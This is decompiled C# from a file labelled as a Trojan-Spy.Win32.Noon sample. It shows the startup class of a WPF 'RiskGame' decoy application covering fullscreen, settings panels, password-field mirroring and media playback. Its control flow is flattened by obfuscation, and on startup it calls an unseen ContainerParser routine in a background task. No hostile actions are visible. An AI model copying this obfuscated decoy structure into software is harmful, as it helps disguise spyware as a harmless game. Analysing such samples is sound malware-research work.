// Decompiled with JetBrains decompiler
// Type: ArrayWithOff.Collections.ParamsPropertyCollection
// Assembly: ArrayWithOff, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C12E9A27-BEBF-4775-817A-6AC642D52B19
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Spy.Win32.Noon.bcra-344266b0bd586b6b9907f1657c694060dd1bae1df9fda81d7433002d419fe4fa.exe

using ArrayWithOff.Annotations;
using RiskGame.Dispatcher;
using RiskGame.Maps;
using RiskGame.Shared;
using RiskGame.Windows;
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Markup;

namespace ArrayWithOff.Collections
{
  public class ParamsPropertyCollection : Application, IComponentConnector, IStyleConnector
  {
    private bool item;

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void OnStartup(StartupEventArgs instance)
    {
      try
      {
        base.OnStartup(instance);
        int num1 = 3;
        MappingModelDispatcher mappingModelDispatcher;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 3:
              mappingModelDispatcher = new MappingModelDispatcher();
              num1 = 4;
              continue;
            case 1:
            case 4:
              this.MainWindow = (Window) mappingModelDispatcher;
              mappingModelDispatcher.Show();
              goto case 2;
            case 2:
              Task.Factory.StartNew((Action) (() =>
              {
                int num2 = 4;
                int num3;
                bool flag;
                while (true)
                {
                  switch (num2)
                  {
                    case 0:
                    case 1:
                      flag = num3 <= 110;
                      goto case 3;
                    case 2:
                      ++num3;
                      goto case 0;
                    case 3:
                    case 5:
                      if (!flag)
                      {
                        num2 = 6;
                        continue;
                      }
                      Thread.Sleep(10);
                      if (true)
                      {
                        num2 = 2;
                        continue;
                      }
                      goto case 2;
                    case 4:
                      num3 = 1;
                      // ISSUE: reference to a compiler-generated method
                      if (ParamsPropertyCollection.ContainerParser.RestartPool())
                      {
                        num2 = 0;
                        continue;
                      }
                      goto case 3;
                    case 6:
                      goto label_4;
                    default:
                      num2 = 5;
                      continue;
                  }
                }
label_4:;
              }));
              num1 = 5;
              continue;
            case 5:
              goto label_8;
            default:
              num1 = 2;
              continue;
          }
        }
label_8:;
      }
      catch (TaskCanceledException ex)
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void InstantiateSerializer(object ident, KeyEventArgs b)
    {
      int num1 = 1;
      if (ParamsPropertyCollection.SelectContainer())
        goto label_11;
label_1:
      Window window;
      bool flag1 = this.NewSerializer(window);
      int num2 = 5;
label_10:
      num1 = num2;
label_11:
      bool flag2;
      switch (num1)
      {
        case 0:
        case 3:
          goto label_1;
        case 1:
          window = (Window) ident;
          num2 = 6;
          goto label_10;
        case 2:
        case 4:
          if (!flag2)
            break;
          goto label_1;
        case 5:
          if (flag1)
          {
            this.GetSerializer(window);
            goto case 7;
          }
          else
          {
            this.MoveSerializer(window);
            num2 = 7;
            goto label_10;
          }
        case 6:
          if (b.Key == Key.F11)
            this.GetSerializer(window);
          flag2 = b.Key == Key.Escape;
          num2 = 4;
          goto label_10;
        case 7:
          break;
        default:
          num2 = 0;
          goto label_10;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void CloneSerializer(object v, EventArgs cfg) => this.CalcSerializer((Window) v);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void CalcSerializer(Window last)
    {
      try
      {
        bool flag = last == null;
        int num1 = 1;
        CheckBox name;
        while (true)
        {
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 1:
                if (!flag)
                {
                  name = (CheckBox) last.FindName("chkFullscreen");
                  if (true)
                  {
                    num2 = 4;
                    continue;
                  }
                  goto label_10;
                }
                else
                  goto label_8;
              case 2:
                goto label_15;
              case 3:
                goto label_16;
              case 4:
                goto label_2;
              case 5:
                goto label_12;
              default:
                goto label_6;
            }
          }
label_2:
          if (!this.NewSerializer(last))
          {
            name.IsChecked = new bool?(false);
            num1 = 5;
            continue;
          }
          break;
label_6:
          num1 = 3;
        }
        name.IsChecked = new bool?(true);
        return;
label_15:
        return;
label_16:
        return;
label_8:
        throw new NullReferenceException();
label_10:
        return;
label_12:;
      }
      catch (Exception ex)
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CompareSerializer(object var1, RoutedEventArgs pol) => this.GetSerializer(this.OrderSerializer());

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void GetSerializer(Window reference)
    {
      try
      {
        bool flag = this.NewSerializer(reference);
        int num1 = 2;
        while (true)
        {
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 2:
                if (!flag)
                {
                  reference.ResizeMode = ResizeMode.NoResize;
                  num2 = 4;
                  continue;
                }
                goto label_8;
              case 1:
              case 5:
                goto label_3;
              case 3:
                goto label_12;
              case 4:
                reference.WindowState = WindowState.Normal;
                reference.WindowStyle = WindowStyle.None;
                reference.WindowState = WindowState.Maximized;
                num2 = 6;
                continue;
              case 6:
                goto label_10;
              default:
                goto label_6;
            }
          }
label_6:
          num1 = 3;
          continue;
label_8:
          reference.ResizeMode = ResizeMode.CanResize;
          reference.WindowState = WindowState.Normal;
          num1 = 5;
        }
label_3:
        reference.WindowStyle = WindowStyle.SingleBorderWindow;
        return;
label_12:
        return;
label_10:;
      }
      catch (NullReferenceException ex)
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private Window OrderSerializer() => Application.Current.MainWindow;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public bool NewSerializer(Window setup)
    {
      int num1 = 1;
      bool flag1;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              goto label_7;
            case 2:
            case 3:
              goto label_5;
            case 4:
              goto label_1;
            case 5:
              goto label_8;
            default:
              num2 = 3;
              continue;
          }
        }
label_1:
        bool flag2;
        if (!flag2)
        {
          flag1 = false;
          num1 = 5;
          continue;
        }
        break;
label_7:
        flag2 = setup.WindowState == WindowState.Maximized;
        num1 = 4;
      }
label_5:
      flag1 = true;
label_8:
      return flag1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void InitSerializer(object spec, RoutedEventArgs caller)
    {
      try
      {
        Window reference = this.OrderSerializer();
        int num1 = 3;
        if (true)
          goto label_7;
label_2:
        bool flag;
        if (flag)
          throw new NullReferenceException();
        this.MoveSerializer(reference);
        int num2 = 4;
        num1 = ParamsPropertyCollection.QueryContainer() ? num2 : num2;
label_7:
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 3:
              goto label_6;
            case 1:
            case 2:
              goto label_2;
            case 4:
              goto label_5;
            default:
              num1 = 2;
              continue;
          }
        }
label_6:
        flag = reference == null;
        goto label_2;
label_5:;
      }
      catch (NullReferenceException ex)
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void MoveSerializer(Window reference)
    {
      int num1 = 3;
      StackPanel name1;
      UIElement name2;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              goto label_10;
            case 2:
              goto label_1;
            case 3:
              if (!(reference is ProducerServerAnnotation))
              {
                int num3 = 0;
                num2 = ParamsPropertyCollection.QueryContainer() ? num3 : num3;
                continue;
              }
              goto label_11;
            case 4:
              goto label_8;
            case 5:
              goto label_15;
            case 6:
              goto label_14;
            default:
              goto label_5;
          }
        }
label_5:
        num1 = 4;
        continue;
label_10:
        int num4 = reference is Tutorial ? 1 : 0;
        goto label_12;
label_11:
        num4 = 1;
label_12:
        if (num4 == 0)
        {
          name1 = (StackPanel) reference.FindName("panel_MainUI");
          name2 = (UIElement) reference.FindName("panel_Settings");
          if (name1.Visibility != Visibility.Visible)
          {
            this.Return(name1, name2);
            num1 = 6;
          }
          else
            goto label_8;
        }
        else
          num1 = 5;
      }
label_1:
      return;
label_15:
      return;
label_8:
      this.Settings(name1, name2);
      return;
label_14:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void Settings(StackPanel panel_MainUI, UIElement panel_Settings)
    {
      panel_MainUI.Visibility = Visibility.Collapsed;
      panel_Settings.Visibility = Visibility.Visible;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void Return(StackPanel panel_MainUI, UIElement panel_Settings)
    {
      panel_MainUI.Visibility = Visibility.Visible;
      panel_Settings.Visibility = Visibility.Collapsed;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ReflectSerializer(object info, TextChangedEventArgs map)
    {
      int num1 = 2;
      if (ParamsPropertyCollection.QueryContainer())
        ;
      while (true)
      {
        PasswordBox passwordBox;
        TextBox textBox;
        string name;
        int num2;
        Window window;
        switch (num1)
        {
          case 0:
          case 2:
            textBox = (TextBox) info;
            if (ParamsPropertyCollection.SelectContainer())
            {
              num1 = 7;
              continue;
            }
            goto label_17;
          case 1:
          case 7:
            window = this.OrderSerializer();
            int num3 = 6;
            num1 = ParamsPropertyCollection.QueryContainer() ? num3 : num3;
            continue;
          case 3:
          case 4:
            passwordBox.Password = textBox.Text;
            if (true)
            {
              num1 = 8;
              continue;
            }
            goto case 1;
          case 5:
            if (!(name == "txtPassShow") && !(name == "txtNewPassShow") && !(name == "txtNewPassConfShow"))
            {
              if (!(name == "txtRegPassShow"))
              {
                if (name == "txtRegPassConfShow")
                {
                  passwordBox = (PasswordBox) window.FindName("txtRegPassConf");
                  goto case 3;
                }
                else
                {
                  if (name == "txtLogPassShow")
                  {
                    passwordBox = (PasswordBox) window.FindName("txtLogPass");
                    num2 = 3;
                    break;
                  }
                  goto case 3;
                }
              }
              else
              {
                passwordBox = (PasswordBox) window.FindName("txtRegPass");
                goto case 3;
              }
            }
            else
              goto label_11;
          case 6:
            passwordBox = new PasswordBox();
            name = textBox.Name;
            num2 = 5;
            break;
          case 8:
            goto label_17;
          default:
            num2 = 4;
            break;
        }
        num1 = num2;
      }
label_11:
      return;
label_17:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void ManageSerializer(object config, RoutedEventArgs visitor)
    {
      int num1 = 4;
      if (ParamsPropertyCollection.QueryContainer())
        ;
      while (true)
      {
        Tutorial tutorial;
        bool flag1;
        int num2;
        bool flag2;
        switch (num1)
        {
          case 0:
          case 4:
            flag1 = false;
            num2 = 3;
            break;
          case 1:
          case 2:
            if (flag2)
            {
              tutorial = new Tutorial();
              goto case 5;
            }
            else
              goto label_13;
          case 3:
            IEnumerator enumerator = Application.Current.Windows.GetEnumerator();
            try
            {
label_12:
              while (enumerator.MoveNext())
              {
                Window current = (Window) enumerator.Current;
                int num3 = 2;
                while (true)
                {
                  int num4 = num3;
                  while (true)
                  {
                    switch (num4)
                    {
                      case 0:
                      case 2:
                        if (!(current is Tutorial))
                          goto label_12;
                        else
                          goto case 1;
                      case 1:
                      case 3:
                        flag1 = true;
                        int num5 = 4;
                        num4 = ParamsPropertyCollection.QueryContainer() ? num5 : num5;
                        continue;
                      case 4:
                        goto label_17;
                      default:
                        goto label_9;
                    }
                  }
label_9:
                  num3 = 3;
                }
              }
            }
            finally
            {
              if (enumerator is IDisposable disposable)
                disposable.Dispose();
            }
label_17:
            flag2 = !flag1;
            if (true)
            {
              num1 = 1;
              continue;
            }
            goto case 1;
          case 5:
            tutorial.Show();
            if (true)
            {
              num1 = 6;
              continue;
            }
            goto case 0;
          case 6:
            goto label_23;
          default:
            num2 = 5;
            break;
        }
        num1 = num2;
      }
label_13:
      return;
label_23:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void SetupSerializer(object task, RoutedPropertyChangedEventArgs<double> ivk) => this.CountSerializer().Volume = ((RangeBase) task).Value;

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void IncludeSerializer(object info, RoutedEventArgs token)
    {
      int num1 = 4;
      while (true)
      {
        int num2 = num1;
        bool flag;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
              flag = info is MediaElement;
              if (ParamsPropertyCollection.SelectContainer())
              {
                num2 = 2;
                continue;
              }
              goto label_8;
            case 1:
            case 2:
              goto label_1;
            case 3:
              goto label_5;
            case 5:
              goto label_8;
            default:
              num2 = 3;
              continue;
          }
        }
label_1:
        if (!flag)
        {
          this.StopSerializer();
          num1 = 5;
        }
        else
          break;
      }
label_5:
      this.RemoveSerializer((MediaElement) info);
      return;
label_8:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void RateSerializer(object param, RoutedEventArgs visitor)
    {
      int num1 = 0;
      if (true)
        goto label_4;
label_1:
      bool flag = param is MediaElement;
      if (true)
      {
        num1 = 3;
        goto label_4;
      }
label_2:
      int num2;
      if (!flag)
      {
        this.StopSerializer();
        num2 = 5;
      }
      else
        goto label_6;
label_3:
      num1 = num2;
label_4:
      switch (num1)
      {
        case 0:
          goto label_1;
        case 1:
        case 3:
          goto label_2;
        case 2:
        case 4:
          break;
        case 5:
          return;
        default:
          num2 = 4;
          goto label_3;
      }
label_6:
      this.RemoveSerializer((MediaElement) param);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void AddSerializer(object var1, RoutedEventArgs counter)
    {
      int num = 3;
      if (true)
        goto label_5;
label_1:
      Window key = this.OrderSerializer();
      if (true)
      {
        num = 4;
        goto label_5;
      }
label_2:
      bool flag;
      if (!flag)
        return;
      this.DestroySerializer(key).Pause();
      if (true)
      {
        num = 5;
        goto label_5;
      }
label_4:
      flag = this.ResetSerializer(key);
      goto label_2;
label_5:
      while (true)
      {
        switch (num)
        {
          case 0:
          case 3:
            goto label_1;
          case 1:
          case 4:
            goto label_4;
          case 2:
            goto label_2;
          case 5:
            goto label_7;
          default:
            if (!ParamsPropertyCollection.QueryContainer())
            {
              num = 2;
              continue;
            }
            goto label_7;
        }
      }
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ExcludeSerializer(object init, RoutedEventArgs connection)
    {
      int num1 = 0;
      if (!ParamsPropertyCollection.QueryContainer())
        goto label_6;
label_1:
      Window key = this.OrderSerializer();
      if (true)
      {
        num1 = 4;
        goto label_6;
      }
label_2:
      bool flag;
      if (!flag)
        return;
      this.DestroySerializer(key).Play();
      int num2 = 5;
label_5:
      num1 = num2;
label_6:
      switch (num1)
      {
        case 0:
          goto label_1;
        case 1:
        case 4:
          flag = this.ResetSerializer(key);
          goto label_2;
        case 2:
        case 3:
          goto label_2;
        case 5:
          break;
        default:
          num2 = 3;
          goto label_5;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void WriteSerializer(object instance, RoutedEventArgs b) => this.RateSerializer(instance, b);

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ValidateSerializer(object reference, RoutedEventArgs connection)
    {
      try
      {
        Window window = this.OrderSerializer();
        this.InterruptSerializer((MediaElement) reference, (Label) window.FindName("lblMediaDetails"));
      }
      catch (NullReferenceException ex)
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private bool ResetSerializer(Window key)
    {
      int num1 = 2;
      bool flag1;
      while (true)
      {
        int num2 = num1;
        bool flag2;
        bool flag3;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              flag2 = key is ConsumerHelperMap;
              if (true)
              {
                num2 = 6;
                continue;
              }
              goto label_17;
            case 1:
              if (!flag3)
              {
                if (!(key is RiskGame.Visitors.Decorator))
                {
                  flag1 = false;
                  if (ParamsPropertyCollection.SelectContainer())
                  {
                    num2 = 7;
                    continue;
                  }
                  goto label_12;
                }
                else
                  goto label_14;
              }
              else
                goto label_12;
            case 3:
            case 4:
            case 7:
              goto label_17;
            case 5:
              goto label_12;
            case 6:
              goto label_1;
            default:
              int num3 = 5;
              num2 = ParamsPropertyCollection.QueryContainer() ? num3 : num3;
              continue;
          }
        }
label_1:
        if (!flag2)
        {
          if (!(key is Bridge))
          {
            flag3 = key is Token;
            num1 = 1;
            continue;
          }
          goto label_4;
        }
        else
          break;
label_14:
        flag1 = (key as RiskGame.Visitors.Decorator).Music_enabled;
        num1 = 3;
      }
      flag1 = (key as ConsumerHelperMap).Music_enabled;
      goto label_17;
label_4:
      flag1 = (key as Bridge).Music_enabled;
      goto label_17;
label_12:
      flag1 = (key as Token).Music_enabled;
label_17:
      return flag1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void InterruptSerializer(MediaElement value, Label ord) => ord.Content = (object) value.Source.ToString().Substring(30);

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void DeleteSerializer(Window var1, object map)
    {
      try
      {
        this.InterruptSerializer((MediaElement) map, (Label) var1.FindName("lblMediaDetails"));
      }
      catch (Exception ex)
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private MediaElement CountSerializer() => this.DestroySerializer(this.OrderSerializer());

    [MethodImpl(MethodImplOptions.NoInlining)]
    private MediaElement DestroySerializer(Window value)
    {
      MediaElement mediaElement;
      try
      {
        MediaElement name = (MediaElement) value.FindName("mediaplayer");
        int num = 2;
        bool flag;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 2:
              flag = name != null;
              goto case 1;
            case 1:
            case 3:
              if (flag)
              {
                mediaElement = name;
                num = 4;
                continue;
              }
              goto label_7;
            case 4:
              goto label_9;
            default:
              if (!ParamsPropertyCollection.QueryContainer())
              {
                num = 3;
                continue;
              }
              goto label_9;
          }
        }
label_7:
        throw new NullReferenceException();
      }
      catch
      {
        mediaElement = new MediaElement();
      }
label_9:
      return mediaElement;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void StopSerializer() => this.RemoveSerializer(this.CountSerializer());

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void RemoveSerializer(MediaElement i)
    {
      int num1 = 2;
      while (true)
      {
        int num2 = num1;
        Window key;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              key = this.OrderSerializer();
              num2 = 3;
              continue;
            case 1:
            case 3:
              goto label_1;
            case 4:
              goto label_6;
            case 5:
              goto label_8;
            default:
              goto label_5;
          }
        }
label_1:
        if (!this.ResetSerializer(key))
          break;
        goto label_6;
label_5:
        num1 = 4;
        continue;
label_6:
        i.Play();
        num1 = 5;
      }
      return;
label_8:;
    }

    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void InitializeComponent()
    {
      int num1 = 3;
      while (true)
      {
        int num2 = num1;
        bool flag;
        Uri resourceLocator;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              goto label_1;
            case 1:
            case 5:
              if (!flag)
              {
                this.item = true;
                resourceLocator = new Uri("/ArrayWithOff;component/app.xaml", UriKind.Relative);
                goto case 2;
              }
              else
              {
                num2 = 4;
                continue;
              }
            case 2:
              Application.LoadComponent((object) this, resourceLocator);
              num2 = 6;
              continue;
            case 4:
              goto label_10;
            case 6:
              goto label_9;
            default:
              num2 = 2;
              continue;
          }
        }
label_1:
        flag = this.item;
        num1 = 5;
      }
label_10:
      return;
label_9:;
    }

    [EditorBrowsable(EditorBrowsableState.Never)]
    [DebuggerNonUserCode]
    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [MethodImpl(MethodImplOptions.NoInlining)]
    void IComponentConnector.Connect(int resend, object pol) => this.item = true;

    [DebuggerNonUserCode]
    [EditorBrowsable(EditorBrowsableState.Never)]
    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [MethodImpl(MethodImplOptions.NoInlining)]
    void IStyleConnector.Connect(int max_init, object token)
    {
      int num1 = 13;
      EventSetter eventSetter;
      while (true)
      {
        int num2;
        int num3;
        int num4;
        switch (num1)
        {
          case 0:
            goto label_28;
          case 1:
          case 12:
            goto label_18;
          case 2:
            goto label_32;
          case 3:
            goto label_13;
          case 4:
            eventSetter.Event = ButtonBase.ClickEvent;
            num2 = 3;
            break;
          case 5:
            goto label_2;
          case 6:
            goto label_24;
          case 7:
            ((Style) token).Setters.Add((SetterBase) eventSetter);
            eventSetter = new EventSetter();
            eventSetter.Event = MediaElement.MediaOpenedEvent;
            eventSetter.Handler = (Delegate) new RoutedEventHandler(this.ValidateSerializer);
            num1 = 10;
            continue;
          case 8:
            goto label_8;
          case 9:
            switch (num4)
            {
              case 1:
                eventSetter = new EventSetter();
                num2 = 15;
                break;
              case 2:
                eventSetter = new EventSetter();
                if (true)
                {
                  num1 = 0;
                  continue;
                }
                goto label_4;
              case 3:
                goto label_29;
              case 4:
                eventSetter = new EventSetter();
                if (!ParamsPropertyCollection.QueryContainer())
                {
                  num1 = 4;
                  continue;
                }
                goto label_31;
              case 5:
                goto label_14;
              case 6:
                eventSetter = new EventSetter();
                eventSetter.Event = ButtonBase.ClickEvent;
                eventSetter.Handler = (Delegate) new RoutedEventHandler(this.AddSerializer);
                ((Style) token).Setters.Add((SetterBase) eventSetter);
                if (ParamsPropertyCollection.SelectContainer())
                {
                  num1 = 2;
                  continue;
                }
                goto label_10;
              case 7:
                goto label_11;
              case 8:
                eventSetter = new EventSetter();
                int num5 = 6;
                num1 = ParamsPropertyCollection.QueryContainer() ? num5 : num5;
                continue;
              case 9:
                eventSetter = new EventSetter();
                eventSetter.Event = ButtonBase.ClickEvent;
                num1 = 16;
                continue;
              case 10:
                goto label_6;
              case 11:
                eventSetter = new EventSetter();
                num2 = 1;
                break;
              case 12:
                eventSetter = new EventSetter();
                eventSetter.Event = MediaElement.MediaEndedEvent;
                eventSetter.Handler = (Delegate) new RoutedEventHandler(this.WriteSerializer);
                num2 = 7;
                break;
              default:
                goto label_33;
            }
            break;
          case 10:
            ((Style) token).Setters.Add((SetterBase) eventSetter);
            num2 = 17;
            break;
          case 11:
          case 16:
            goto label_5;
          case 13:
label_4:
            num3 = max_init;
            num2 = 14;
            break;
          case 14:
            num4 = num3;
            if (ParamsPropertyCollection.SelectContainer())
            {
              num1 = 9;
              continue;
            }
            goto case 15;
          case 15:
            eventSetter.Event = UIElement.KeyDownEvent;
            if (true)
            {
              num1 = 5;
              continue;
            }
            goto label_24;
          case 17:
            goto label_34;
          default:
            num2 = 8;
            break;
        }
        num1 = num2;
      }
label_2:
      eventSetter.Handler = (Delegate) new KeyEventHandler(this.InstantiateSerializer);
      ((Style) token).Setters.Add((SetterBase) eventSetter);
      return;
label_5:
      eventSetter.Handler = (Delegate) new RoutedEventHandler(this.CompareSerializer);
      ((Style) token).Setters.Add((SetterBase) eventSetter);
      return;
label_6:
      ((Style) token).Setters.Add((SetterBase) new EventSetter()
      {
        Event = RangeBase.ValueChangedEvent,
        Handler = (Delegate) new RoutedPropertyChangedEventHandler<double>(this.SetupSerializer)
      });
      return;
label_8:
      ((Style) token).Setters.Add((SetterBase) eventSetter);
      return;
label_10:
      return;
label_11:
      ((Style) token).Setters.Add((SetterBase) new EventSetter()
      {
        Event = ButtonBase.ClickEvent,
        Handler = (Delegate) new RoutedEventHandler(this.ExcludeSerializer)
      });
      return;
label_13:
      eventSetter.Handler = (Delegate) new RoutedEventHandler(this.ManageSerializer);
      ((Style) token).Setters.Add((SetterBase) eventSetter);
      return;
label_14:
      eventSetter = new EventSetter();
      eventSetter.Event = ButtonBase.ClickEvent;
      eventSetter.Handler = (Delegate) new RoutedEventHandler(this.IncludeSerializer);
      goto label_8;
label_32:
      return;
label_34:
      return;
label_18:
      eventSetter.Event = TextBoxBase.TextChangedEvent;
      eventSetter.Handler = (Delegate) new TextChangedEventHandler(this.ReflectSerializer);
      ((Style) token).Setters.Add((SetterBase) eventSetter);
      return;
label_24:
      eventSetter.Event = ButtonBase.ClickEvent;
      eventSetter.Handler = (Delegate) new RoutedEventHandler(this.RateSerializer);
      ((Style) token).Setters.Add((SetterBase) eventSetter);
      return;
label_33:
      return;
label_28:
      eventSetter.Event = ButtonBase.ClickEvent;
      eventSetter.Handler = (Delegate) new RoutedEventHandler(this.InitSerializer);
      ((Style) token).Setters.Add((SetterBase) eventSetter);
      return;
label_29:
      ((Style) token).Setters.Add((SetterBase) new EventSetter()
      {
        Event = ButtonBase.ClickEvent,
        Handler = (Delegate) new RoutedEventHandler(this.InitSerializer)
      });
      return;
label_31:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public ParamsPropertyCollection()
    {
    }

    internal static bool SelectContainer() => true;

    internal static bool QueryContainer() => false;
  }
}
